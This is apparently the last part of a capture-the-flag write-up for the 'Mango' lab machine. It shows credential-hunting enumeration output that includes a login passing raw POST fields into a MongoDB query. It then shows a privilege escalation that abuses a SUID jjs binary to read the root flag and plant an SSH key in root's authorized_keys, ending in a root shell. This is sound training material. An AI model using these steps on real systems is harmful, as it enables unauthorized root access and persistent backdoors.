/var/log/cloud-init.log:2019-09-30 02:52:46,170 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-09-30 03:15:47,929 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-10-10 08:22:45,706 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-10-10 08:33:04,018 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-08 22:38:17,418 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/dpkg.log:2019-02-14 09:49:32 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 install base-passwd:amd64 <none> 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:39 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:39 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:39 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:41 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2019-02-14 09:49:41 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:41 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:41 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:43 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2019-02-14 09:49:43 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:43 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:43 status unpacked passwd:amd64 1:4.5-1ubuntu1

[+] Finding emails inside logs (limit 70)
      2 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70)
/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
/etc/cloud/cloud.cfg:     lock_passwd: True
/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/nsswitch.conf:passwd:         compat systemd
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0
/var/www/staging/index.php:<input type="password" name="password" class="form-field animation a4" placeholder="Password">
/var/www/staging/index.php:$user = $collection->find(array("username"=>$_POST['username'],"password"=>$_POST['password']));
/var/www/staging/vendor/alcaeus/mongo-php-adapter/lib/Mongo/Mongo.php:    public function pairPersistConnect($username = "", $password = "")
/var/www/staging/vendor/alcaeus/mongo-php-adapter/lib/Mongo/Mongo.php:    public function persistConnect($username = "", $password = "")
/var/www/staging/vendor/mongodb/mongodb/docs/reference/method/MongoDBClient__construct.txt:           'password' => 'myPassword',
/var/www/staging/vendor/mongodb/mongodb/docs/tutorial/commands.txt:           'pwd' => 'password',

[+] Finding possible password variables inside key folders (limit 140)
/var/www/staging/vendor/mongodb/mongodb/phpunit.xml.dist:        <env name="MONGODB_DATABASE" value="phplib_test"/>
/var/www/staging/vendor/mongodb/mongodb/tests/TestCase.php:        return getenv('MONGODB_DATABASE') ?: 'phplib_test';

[+] Finding possible password in config files
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,
 /etc/adduser.conf
passwd
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/overlayroot.conf
password is randomly generated
password will be stored for recovery in
passwd
password,mkfs=0
PASSWORD="foobar"
PASSWORD" |
PASSWORD" |
PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
passwords are more secure, but you won't be able to
passwords are generated by calculating the sha512sum
 /etc/apache2/apache2.conf
passwd files from being
 /etc/nsswitch.conf
passwd:         compat systemd

[+] Finding 'username' string inside key folders (limit 70)
/var/www/staging/index.php:<input type="username" name="username" class="form-field animation a3" placeholder="Username">
/var/www/staging/index.php:	$_SESSION['username'] = $obj['username'];
/var/www/staging/index.php:$user = $collection->find(array("username"=>$_POST['username'],"password"=>$_POST['password']));
/var/www/staging/vendor/alcaeus/mongo-php-adapter/lib/Mongo/Mongo.php:    public function pairPersistConnect($username = "", $password = "")
/var/www/staging/vendor/alcaeus/mongo-php-adapter/lib/Mongo/Mongo.php:    public function persistConnect($username = "", $password = "")
/var/www/staging/vendor/alcaeus/mongo-php-adapter/tests/Alcaeus/MongoDbAdapter/Mongo/MongoCollectionTest.php:                'username' => 'bob',
/var/www/staging/vendor/alcaeus/mongo-php-adapter/tests/Alcaeus/MongoDbAdapter/Mongo/MongoCollectionTest.php:                'username' => 'jones',
/var/www/staging/vendor/mongodb/mongodb/docs/includes/apiargs-MongoDBCollection-method-createIndex-param.yaml:     [ 'username' => -1 ]
/var/www/staging/vendor/mongodb/mongodb/docs/reference/method/MongoDBClient__construct.txt:           'username' => 'myUsername',
/var/www/staging/vendor/mongodb/mongodb/docs/reference/method/MongoDBCollection-insertMany.txt:           'username' => 'admin',
/var/www/staging/vendor/mongodb/mongodb/docs/reference/method/MongoDBCollection-insertMany.txt:           'username' => 'test',
/var/www/staging/vendor/mongodb/mongodb/docs/reference/method/MongoDBCollection-insertOne.txt:       'username' => 'admin',
/var/www/staging/vendor/mongodb/mongodb/docs/reference/method/MongoDBDatabase-createCollection.txt:           'username' => ['$type' => 'string'],
/var/www/staging/vendor/mongodb/mongodb/src/Collection.php:     *         [ 'key' => [ 'username' => 1 ], 'unique' => true ],

[+] Searching specific hashes inside files - less false positives (limit 70)

REVIEW SUID FILE JJS
-rwsr-sr-- 1 root   admin            11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

admin@mango:/home/admin$ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/
admin@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ ls -la
total 188
drwxr-xr-x 2 root root    4096 Sep 27  2019 .
drwxr-xr-x 7 root root    4096 Sep 27  2019 ..
-rwxr-xr-x 1 root root   10296 Jul 18  2019 java
-rwsr-sr-- 1 root admin  10352 Jul 18  2019 jjs
-rwxr-xr-x 1 root root   10320 Jul 18  2019 keytool
-rwxr-xr-x 1 root root   10320 Jul 18  2019 pack200
-rwxr-xr-x 1 root root   10320 Jul 18  2019 rmid
-rwxr-xr-x 1 root root   10320 Jul 18  2019 rmiregistry
-rwxr-xr-x 1 root root  107408 Jul 18  2019 unpack200


CHECK GTFOBINS FOR JJS FILE
https://gtfobins.github.io/gtfobins/jjs/

CAN READ FILES USING JJS SUCH AS ROOT FLAG
jjs> $EXEC("cat /root/root.txt");
################################################

PRIVESC TO GET ROOT SHELL

CREATE SSH KEY TO IMPORT TO MANGO
root@kali:~/htb/mango# mkdir /root/sshRootKeys/
root@kali:~/htb/mango# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/sshRootKeys/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/sshRootKeys/id_rsa.
Your public key has been saved in /root/sshRootKeys/id_rsa.pub.
The key fingerprint is:
SHA256:iL3gFLX2pwWYPrG+mnAgzc5k4g1htT7u/ZFLU2ClheA root@kali
The key's randomart image is:
+---[RSA 2048]----+
|   . .o .o       |
|  . o. =+        |
| o ..E*+.        |
|.oo  *.=..       |
|o.*o+ * S.o      |
|.B++.o oo+       |
| .+oo o=.        |
|  .o....+        |
|   .oooo         |
+----[SHA256]-----+
root@kali:~/htb/mango# vim /root/sshRootKeys/id_rsa.pub
root@kali:~/htb/forest# cat /root/sshRootKeys/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/sUOPm6BLiYQLzKraWk3gab80ibPOSHzncwqf7esqbur+JP7JT34ZuopdeUd4+5XggQPaB6bnHb6mvYUyDZOyouEvTC1E9iJCiOWrUQ0mAxIHSeyH4X026X2CW/FK0Ub9Rr/IovhwZDzBrIHbh/Ms0wQFN7XlsgBvSQ1eXqs1kBzgp+JU7GK5pbRKSdvHR5DR0CyXut+AhBG9LM3tC/4Fa3Hzxx2Oi47lA4KGiguwCxmHOwMiVCfALH944kPxb2bu+BAoNH8mXGvc6jYAPF0S05vXkbMMgpObFTOt4HIUNEuKFAt1eVWwGyCocyQ139UEwIkpzDYbU/57/IPQiRPr root@kali

IMPORT SSH PUB KEY TO MANGO
jjs> $EXEC("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/sUOPm6BLiYQLzKraWk3gab80ibPOSHzncwqf7esqbur+JP7JT34ZuopdeUd4+5XggQPaB6bnHb6mvYUyDZOyouEvTC1E9iJCiOWrUQ0mAxIHSeyH4X026X2CW/FK0Ub9Rr/IovhwZDzBrIHbh/Ms0wQFN7XlsgBvSQ1eXqs1kBzgp+JU7GK5pbRKSdvHR5DR0CyXut+AhBG9LM3tC/4Fa3Hzxx2Oi47lA4KGiguwCxmHOwMiVCfALH944kPxb2bu+BAoNH8mXGvc6jYAPF0S05vXkbMMgpObFTOt4HIUNEuKFAt1eVWwGyCocyQ139UEwIkpzDYbU/57/IPQiRPr root@kali' > /root/.ssh/authorized_keys");

GET ROOT SHELL
root@kali:~/htb/mango# ssh -i /root/sshRootKeys/id_rsa root@10.10.10.162
Enter passphrase for key '/root/sshRootKeys/id_rsa': 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec  9 03:11:26 UTC 2020

  System load:  0.0                Processes:            114
  Usage of /:   27.1% of 19.56GB   Users logged in:      1
  Memory usage: 15%                IP address for ens33: 10.10.10.162
  Swap usage:   4%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Oct 10 08:33:27 2019
root@mango:~# id
uid=0(root) gid=0(root) groups=0(root)
root@mango:~# hostname
mango

GET ROOT FLAG
root@mango:~# cat /root/root.txt
##############################################
